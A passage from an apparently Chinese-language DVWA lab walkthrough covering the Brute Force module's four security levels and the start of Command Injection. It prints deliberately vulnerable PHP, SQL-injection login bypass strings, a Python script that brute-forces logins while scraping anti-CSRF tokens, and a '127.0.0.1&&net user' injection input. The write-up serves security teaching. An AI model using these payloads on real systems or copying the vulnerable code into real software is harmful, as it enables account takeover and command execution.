class="variable">$result</span>,0,<span class="string">"avatar"</span>);</span><br><span class="line"></span><br><span class="line">//Loginsuccessful</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;<span class="variable">$user</span>&#125;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;imgsrc="</span>&#123;<span class="variable">$avatar</span>&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">//Loginfailed</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计"><a href="#审计" class="headerlink" title="审计:"></a>审计:</h4><p>只判断了该login值有没有被设置，对接受的参数没有做任何过滤，存在明显的sql注入漏洞，最后没有任何的方爆破机制</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li>方法一:<br>使用burpsuite的proxy模块抓完包之后send to intruder模块，对password进行爆破，最后尝试在爆破结果中http响应状态或者响应包长度，可推测正确的密码。如下图所示:</li></ul><p><img src="burce01.png" alt=""></p><ul><li>方法二:<br>Username:admin’ or ’1′=’1<br>Password:（空）<br>或者<br>Username :admin’ #<br>Password :（空）</li></ul><h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'Login'</span>]))&#123;</span><br><span class="line">//Sanitiseusernameinput</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$user</span>=mysql_real_escape_string(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">//Sanitisepasswordinput</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$pass</span>=mysql_real_escape_string(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">//Checkthedatabase</span><br><span class="line"><span class="variable">$query</span>=<span class="string">"SELECT*FROM`users`WHEREuser='<span class="variable">$user</span>'ANDpassword='<span class="variable">$pass</span>';"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$query</span>)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>&amp;&amp;mysql_num_rows(<span class="variable">$result</span>)==1)&#123;</span><br><span class="line">//Getusersdetails</span><br><span class="line"><span class="variable">$avatar</span>=mysql_result(<span class="variable">$result</span>,0,<span class="string">"avatar"</span>);</span><br><span class="line"></span><br><span class="line">//Loginsuccessful</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;<span class="variable">$user</span>&#125;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;imgsrc="</span>&#123;<span class="variable">$avatar</span>&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">//Loginfailed</span><br><span class="line">sleep(2);</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-1"><a href="#审计-1" class="headerlink" title="审计:"></a>审计:</h4><p>对比low级别的代码，使用mysql_real_escape_string来对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，这个方法能够抵御一般的sql注入攻击，同时对密码做了MD5校验，杜绝了通过password参数进行sql注入的可能性，此外，对错误输入加入了两秒的延时，但是此举还不是有效的防爆破机制。</p><h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>同Low级别的方法一，使用burp进行爆破攻击。</p><h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'Login'</span>]))&#123;</span><br><span class="line">//CheckAnti-CSRFtoken</span><br><span class="line">checkToken(<span class="variable">$_REQUEST</span>[<span class="string">'user_token'</span>],<span class="variable">$_SESSION</span>[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line"></span><br><span class="line">//Sanitiseusernameinput</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$user</span>=stripslashes(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$user</span>=mysql_real_escape_string(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">//Sanitisepasswordinput</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=mysql_real_escape_string(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">//Checkdatabase</span><br><span class="line"><span class="variable">$query</span>=<span class="string">"SELECT*FROM`users`WHEREuser='<span class="variable">$user</span>'ANDpassword='<span class="variable">$pass</span>';"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$query</span>)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>&amp;&amp;mysql_num_rows(<span class="variable">$result</span>)==1)&#123;</span><br><span class="line">//Getusersdetails</span><br><span class="line"><span class="variable">$avatar</span>=mysql_result(<span class="variable">$result</span>,0,<span class="string">"avatar"</span>);</span><br><span class="line"></span><br><span class="line">//Loginsuccessful</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;<span class="variable">$user</span>&#125;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;imgsrc="</span>&#123;<span class="variable">$avatar</span>&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">//Loginfailed</span><br><span class="line">sleep(rand(0,3));</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//GenerateAnti-CSRFtoken</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-2"><a href="#审计-2" class="headerlink" title="审计:"></a>审计:</h4><p>这种级别差不多是我们日常写到的等级喔，比前面中等级别增加了一个防范无脑爆破的user_token，此举能够抵御CSRF攻击，同时也增加爆破的难度。但是只是增加了爆破的一点成本而已</p><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们不能使用burp对user_token进行抓取，但是我们可以自己写代码伪造请求，我们不做脚本小子，自己来写脚本来破解。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from urllib import request</span><br><span class="line"></span><br><span class="line"><span class="comment">## 伪造头部</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'dvwa.com'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: 1,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.104 Safari/537.36 Core/1.53.4549.400 QQBrowser/9.7.12900.400'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'security=high; PHPSESSID=9uqri734rutq7rpibecc6quud1'</span>,</span><br><span class="line">    <span class="string">'Connection'</span>: <span class="string">'close'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">##获取页面的token值</span></span><br><span class="line">def get_usertoken(indexurl,header):</span><br><span class="line">    reg = request.Request(indexurl,headers=header)</span><br><span class="line">    response = request.urlopen(reg)</span><br><span class="line">    the_page = response.read()</span><br><span class="line">    <span class="built_in">print</span>(str(response.getcode())+<span class="string">' '</span>+str(len(the_page)))</span><br><span class="line">    soup = BeautifulSoup(the_page, <span class="string">"html.parser"</span>)</span><br><span class="line">    user_token = soup.find(<span class="string">'input'</span>,<span class="built_in">type</span>=<span class="string">"hidden"</span>)[<span class="string">'value'</span>]</span><br><span class="line">    <span class="built_in">return</span> user_token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##获取token的url</span></span><br><span class="line">indexurl = <span class="string">'http://dvwa.com/DVWA/vulnerabilities/brute/'</span></span><br><span class="line"><span class="comment">##获取token</span></span><br><span class="line">user_token = get_usertoken(indexurl,header)</span><br><span class="line"></span><br><span class="line">with open(<span class="string">'password.txt'</span>) as f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        login_url = <span class="string">"http://dvwa.com/DVWA/vulnerabilities/brute/?username=admin&amp;password=&#123;&#125;&amp;Login=Login&amp;user_token=&#123;&#125;"</span>.format(line.strip(), user_token)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">'admin'</span>, line.strip(),end=<span class="string">' '</span>)</span><br><span class="line">        user_token = get_usertoken(login_url, header)</span><br></pre></td></tr></table></figure><p>效果如下图:</p><p><img src="bruce02.png" alt=""></p><h3 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php    </span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'Login'</span>]))&#123;</span><br><span class="line">//CheckAnti-CSRFtoken</span><br><span class="line">checkToken(<span class="variable">$_REQUEST</span>[<span class="string">'user_token'</span>],<span class="variable">$_SESSION</span>[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line"></span><br><span class="line">//Sanitiseusernameinput</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$user</span>=stripslashes(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$user</span>=mysql_real_escape_string(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">//Sanitisepasswordinput</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=mysql_real_escape_string(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">//Defaultvalues</span><br><span class="line"><span class="variable">$total_failed_login</span>=3;</span><br><span class="line"><span class="variable">$lockout_time</span>=15;</span><br><span class="line"><span class="variable">$account_locked</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">//Checkthedatabase(Checkuserinformation)</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$db</span>-&gt;prepare(<span class="string">'SELECTfailed_login,last_loginFROMusersWHEREuser=(:user)LIMIT1;'</span>);</span><br><span class="line"><span class="variable">$data</span>-&gt;bindParam(<span class="string">':user'</span>,<span class="variable">$user</span>,PDO::PARAM_STR);</span><br><span class="line"><span class="variable">$data</span>-&gt;execute();</span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">//Checktoseeiftheuserhasbeenlockedout.</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$data</span>-&gt;rowCount()==1)&amp;&amp;(<span class="variable">$row</span>[<span class="string">'failed_login'</span>]&gt;=<span class="variable">$total_failed_login</span>))&#123;</span><br><span class="line">//Userlockedout.Note,usingthismethodwouldallowforuserenumeration!</span><br><span class="line">//<span class="built_in">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Thisaccounthasbeenlockedduetotoomanyincorrectlogins.&lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">//Calculatewhentheuserwouldbeallowedtologinagain</span><br><span class="line"><span class="variable">$last_login</span>=<span class="variable">$row</span>[<span class="string">'last_login'</span>];</span><br><span class="line"><span class="variable">$last_login</span>=strtotime(<span class="variable">$last_login</span>);</span><br><span class="line"><span class="variable">$timeout</span>=strtotime(<span class="string">"&#123;<span class="variable">$last_login</span>&#125;+&#123;<span class="variable">$lockout_time</span>&#125;minutes"</span>);</span><br><span class="line"><span class="variable">$timenow</span>=strtotime(<span class="string">"now"</span>);</span><br><span class="line"></span><br><span class="line">//Checktoseeifenoughtimehaspassed,ifithasn<span class="string">'tlockedtheaccount</span></span><br><span class="line"><span class="string">if($timenow&gt;$timeout)</span></span><br><span class="line"><span class="string">$account_locked=true;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Checkthedatabase(ifusernamematchesthepassword)</span></span><br><span class="line"><span class="string">$data=$db-&gt;prepare('</span>SELECT*FROMusersWHEREuser=(:user)ANDpassword=(:password)LIMIT1;<span class="string">');</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:user<span class="string">',$user,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:password<span class="string">',$pass,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;execute();</span></span><br><span class="line"><span class="string">$row=$data-&gt;fetch();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Ifitsavalidlogin...</span></span><br><span class="line"><span class="string">if(($data-&gt;rowCount()==1)&amp;&amp;($account_locked==false))&#123;</span></span><br><span class="line"><span class="string">//Getusersdetails</span></span><br><span class="line"><span class="string">$avatar=$row['</span>avatar<span class="string">'];</span></span><br><span class="line"><span class="string">$failed_login=$row['</span>failed_login<span class="string">'];</span></span><br><span class="line"><span class="string">$last_login=$row['</span>last_login<span class="string">'];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Loginsuccessful</span></span><br><span class="line"><span class="string">echo"&lt;p&gt;Welcometothepasswordprotectedarea&lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;";</span></span><br><span class="line"><span class="string">echo"&lt;imgsrc="&#123;$avatar&#125;"/&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Hadtheaccountbeenlockedoutsincelastlogin?</span></span><br><span class="line"><span class="string">if($failed_login&gt;=$total_failed_login)&#123;</span></span><br><span class="line"><span class="string">echo"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;:Someonemightofbeenbruteforcingyouraccount.&lt;/p&gt;";</span></span><br><span class="line"><span class="string">echo"&lt;p&gt;Numberofloginattempts:&lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br/&gt;Lastloginattemptwasat:&lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Resetbadlogincount</span></span><br><span class="line"><span class="string">$data=$db-&gt;prepare('</span>UPDATEusersSETfailed_login=<span class="string">"0"</span>WHEREuser=(:user)LIMIT1;<span class="string">');</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:user<span class="string">',$user,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;execute();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else&#123;</span></span><br><span class="line"><span class="string">//Loginfailed</span></span><br><span class="line"><span class="string">sleep(rand(2,4));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Givetheusersomefeedback</span></span><br><span class="line"><span class="string">echo"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;br/&gt;&lt;br/&gt;Alternative,theaccounthasbeenlockedbecauseoftoomanyfailedlogins.&lt;br/&gt;Ifthisisthecase,&lt;em&gt;pleasetryagainin&#123;$lockout_time&#125;minutes&lt;/em&gt;.&lt;/pre&gt;";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Updatebadlogincount</span></span><br><span class="line"><span class="string">$data=$db-&gt;prepare('</span>UPDATEusersSETfailed_login=(failed_login+1)WHEREuser=(:user)LIMIT1;<span class="string">');</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:user<span class="string">',$user,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;execute();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//Setthelastlogintime</span></span><br><span class="line"><span class="string">$data=$db-&gt;prepare('</span>UPDATEusersSETlast_login=now()WHEREuser=(:user)LIMIT1;<span class="string">');</span></span><br><span class="line"><span class="string">$data-&gt;bindParam('</span>:user<span class="string">',$user,PDO::PARAM_STR);</span></span><br><span class="line"><span class="string">$data-&gt;execute();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//GenerateAnti-CSRFtoken</span></span><br><span class="line"><span class="string">generateSessionToken();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="审计-3"><a href="#审计-3" class="headerlink" title="审计:"></a>审计:</h4><p>上面代码加入了可靠的防爆破机制，当检测到频繁的错误的登陆后，系统会将账户锁定，爆破就无法继续，同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令。</p><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p><h3 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping <span class="built_in">command</span>. </span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">        // Windows </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // *nix </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  -c 4 '</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> the end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&#123;<span class="variable">$cmd</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-4"><a href="#审计-4" class="headerlink" title="审计:"></a>审计:</h4><p>php函数：</p><ul><li><p>stristr(string,search,before_search)<br>stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。</p></li><li><p>php_uname(mode)<br>php_uname — 返回运行 PHP 的系统的有关信息。<br>原型：string php_uname ([ string $mode = “a” ] )。返回运行php的操作系统的相关描述，和 phpinfo() 最顶端上输出的是同一个字符串。 如果仅仅要获取操作系统的名称。可以考虑使用常量 PHP_OS，不过要注意该常量会包含 PHP 构建（built）时的操作系统名。</p></li></ul><h4 id="漏洞利用-3"><a href="#漏洞利用-3" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>window和linux系统都可以用&amp;&amp;来执行多条命令</p><ul><li>127.0.0.1&amp;&amp;net user<br><img src="cinjection02.png" alt=""></li></ul><h3 id="Medium-1"><a href="#Medium-1" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'ip'</span> ]; </span><br><span class="line">    // Set blacklist </span><br><span class="line">    <span class="variable">$substitutions</span> = array( </span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>, </span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,    </span><br><span class="line">    );     </span><br><span class="line">    // Remove any of the charactars <span class="keyword">in</span> the array (blacklist).     </span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );     </span><br><span class="line">    // Determine OS and execute the ping <span class="built_in">command</span>.     </span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;    </span><br><span class="line">        // Windows     </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  '</span> . <span class="variable">$target</span> );    </span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">else</span> &#123;     </span><br><span class="line">        // *nix     </span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">'ping  